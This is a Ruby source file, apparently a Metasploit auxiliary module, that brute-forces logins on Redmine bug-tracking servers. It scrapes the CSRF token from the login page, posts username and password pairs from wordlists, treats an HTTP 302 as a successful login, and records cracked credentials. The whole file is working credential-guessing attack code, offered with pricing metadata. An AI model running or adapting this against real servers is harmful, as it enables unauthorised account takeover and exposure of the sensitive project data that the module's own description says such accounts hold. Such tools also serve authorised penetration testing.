##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/http'

module Metasploit
  module Framework
    module LoginScanner
      class Redmine < ::Metasploit::Framework::LoginScanner::HTTP
        def check_setup

        end

        def get_login_state(username, password)

        end

        def attempt_login(credential)
          result_opts = {
            credential: credential,
            host: host,
            port: port,
            protocol: 'tcp',
            #service_name: 'http'
          }

          begin
            cli = Rex::Proto::Http::Client.new(host, port, {'Msf'=>framework,'MsfExploit'=>framework_module},ssl,ssl_version,proxies,http_username,http_password)
            configure_http_client(cli)
            cli.connect

            req = cli.request_cgi({
              'uri' => uri
            })

            res = cli.send_recv(req)
            unless res
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
              return ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
            end

            res.body =~ /<meta name="csrf-token" content="(.*?)" \/>/
            csrf = $1

            unless csrf
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
              return ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
            end

            req = cli.request_cgi({
              'method' => 'POST',
              'uri' => uri + '/login',
              'vars_post' => {
                'authenticity_token' => csrf,
                'username' => credential.public,
                'password' => credential.private
              },
              'cookie' => res.get_cookies
            })

            res = cli.send_recv(req)

            unless res
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
              return ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
            end

            if res.code == 302
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
            else
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res.body)
            end


          rescue Exception => e
            result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
          end

          ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
        end
      end
    end
  end
end


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
        'Name'           => 'Redmine Login Scanner',
        'Description'    => %q(
        This module bruteforces weak credentials on a Redmine instance.

        Redmine is a popular open source bug tracking software that allows
        software projects to easily manage features and bug reports. Weak credentials
        in bug tracking software can often yield sensitive information such as
        potential network weak spots, internal credentials, or internal high value targets.

        Categories: Open Source

        Price: 2

        Video: none

        OS: Multi

        Arch: Multi

        Requirements: Metasploit Framework
        ),
        'Author'         =>
          [
          ],
        'License'        => 'VolatileMinds',
        'References'     =>
          [
          ],
        'DefaultOptions' => {
            'RPORT'           => 80,
            'STOP_ON_SUCCESS' => true
        }
    )
  end

  def run_host(ip)
    cred_collection = ::Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::Redmine.new(
      configure_http_login_scanner(
        uri: datastore['TARGETURI'],
        host: ip,
        port: datastore['RPORT'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword'],
      )
    )

    scanner.scan! do |result|
      creds = result.to_h
      creds.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )

      if result.success?
        credcore = create_credential(creds)
        creds[:core] = credcore
        create_credential_login(creds)
        print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
      else
        invalidate_login(creds)
        vprint_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})")
      end
    end
  end
end
